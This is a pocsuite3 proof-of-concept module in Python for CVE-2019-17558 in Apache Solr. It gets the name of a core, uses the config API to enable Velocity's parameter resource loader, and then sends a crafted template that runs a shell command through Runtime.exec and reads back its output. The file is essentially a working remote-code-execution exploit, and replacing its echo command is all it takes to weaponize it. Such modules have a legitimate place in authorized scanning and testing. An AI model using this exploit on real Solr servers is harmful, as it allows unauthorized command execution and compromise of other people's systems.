#!/usr/bin/env python
# coding: utf-8
from urllib.parse import urlparse
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE
import json


class TestPOC(POCBase):
    vulID = ''
    version = '1'
    author = 'jerome'
    vulDate = '2019-12-25'
    createDate = '2020-2-16'
    updateDate = '2020-2-16'
    references = [
        'hhttps://github.com/vulhub/vulhub/blob/master/solr/CVE-2019-17558/README.zh-cn.md']
    name = 'Apache Solr Velocity 注入远程命令执行漏洞 (CVE-2019-17558)'
    appPowerLink = 'https://issues.apache.org/jira/browse/SOLR-13971'
    appName = 'Solr'
    appVersion = '< 8.4'
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.REMOTE
    desc = '''
        Apache Solr 是一个开源的搜索服务器。在其 5.0.0 到 8.3.1版本中，用户可以注入自定义模板，通过Velocity模板语言执行任意命令。
    '''

    def _verify(self):
        result = {}

        pr = urlparse(self.url)
        if pr.port:
            ports = [pr.port]
        else:
            ports = [8983]
        for port in ports:
            target = '{}://{}:{}'.format(pr.scheme, pr.hostname, port)
            # 获取目标系统任意核心
            target1 = target + "/solr/admin/cores?indexInfo=false&wt=json"
            headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:73.0) Gecko/20100101 Firefox/73.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                       "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "DNT": "1", "Connection": "close", "Referer": self.url, "Upgrade-Insecure-Requests": "1"}
            res1 = req.get(target1, headers=headers)
            core = json.loads(res1.content.decode())
            core2 = core['status'].keys()
            core3 = list(core2)[0]

            # 修改core下的配置文件,开启params.resource.loader.enabled
            target2 = target + "/solr/" + core3 + "/config"
            post_json = {"update-queryresponsewriter": {"class": "solr.VelocityResponseWriter", "name": "velocity",
                                                        "params.resource.loader.enabled": "true", "solr.resource.loader.enabled": "true", "startup": "lazy", "template.base.dir": ""}}
            res2 = req.post(target2, headers=headers, json=post_json)

            # 开启后，直接Get 访问（带入表达式）进行 远程代码命令执行
            target3 = target + "/solr/" + core3 + \
                "/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27echo%20d0xdeadbeaf%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
            response = req.get(target3, headers=headers)
            if response and response.status_code == 200 and "0xdeadbeaf" in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = '{}:{}'.format(
                    pr.hostname, port)
                break
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output


register_poc(TestPOC)
